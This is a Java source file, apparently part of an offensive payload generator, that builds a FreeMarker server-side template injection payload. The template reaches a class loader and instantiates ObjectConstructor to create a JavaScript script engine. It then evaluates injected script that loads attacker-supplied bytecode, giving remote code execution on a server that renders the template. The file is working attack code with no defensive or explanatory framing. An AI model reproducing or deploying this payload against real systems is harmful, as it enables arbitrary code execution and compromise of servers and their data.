package cn.butler.template.payloads;

import cn.butler.payloads.ObjectPayload;
import cn.butler.payloads.PayloadRunner;
import cn.butler.thirdparty.payloads.expression.JSExpression;

public class FreeMarkerDataModel implements ObjectPayload<Object> {
    @Override
    public Object getObject(String command) throws Exception {
        String[] parts = command.split(":", 2);
        Object[] objects = (Object [])ObjectPayload.Utils.makePayloadObject("ThirdPartyAttack","CustomClass",parts[1]);
        byte[] byteCode = (byte[]) objects[1];
        String jsExpression = JSExpression.commonExpressModify(byteCode);
        String freeMarkerDataModel = String.format("<#assign classloader=%s.class.protectionDomain.classLoader>\n" +
            "<#assign ocClass=classloader.loadClass(\"freemarker.template.utility.ObjectConstructor\")>\n" +
            "<#assign owc=classloader.loadClass(\"freemarker.template.ObjectWrapper\")>\n" +
            "<#assign dwf=owc.getField(\"DEFAULT_WRAPPER\").get(null)>\n" +
            "<#assign oc=dwf.newInstance(ocClass,null)>\n" +
            "<#assign manager=oc(\"javax.script.ScriptEngineManager\")>\n" +
            "<#assign engine=manager.getEngineByName(\"javascript\")>\n" +
            "<#if engine.put(\"classloader\",classloader)??></#if>\n" +
            "<#assign script =\"%s\">\n" +
            "${script}\n" +
            "<#if engine.eval(script)??></#if>",parts[0],jsExpression);
        return freeMarkerDataModel;
    }

    public static void main(String[] args) throws Exception {
        PayloadRunner.run(FreeMarkerDataModel.class, args);
    }
}
